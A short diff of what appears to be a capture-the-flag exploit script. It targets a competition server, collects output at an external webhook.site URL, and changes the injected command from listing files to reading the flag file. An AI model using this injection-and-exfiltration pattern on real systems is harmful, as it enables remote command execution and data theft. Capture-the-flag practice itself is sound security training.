@@ -3,7 +3,7 @@ import json
 
 WEBHOOK = "https://webhook.site/ccad15f1-22b1-4020-bc69-54fb3f617d66"
 TARGET = "http://ctf-gemastik.ub.ac.id:10021"
-COMMAND = "ls"
+COMMAND = "cat /y0r_pr1z3"
 
 inject_payload = {
     "title": "1",
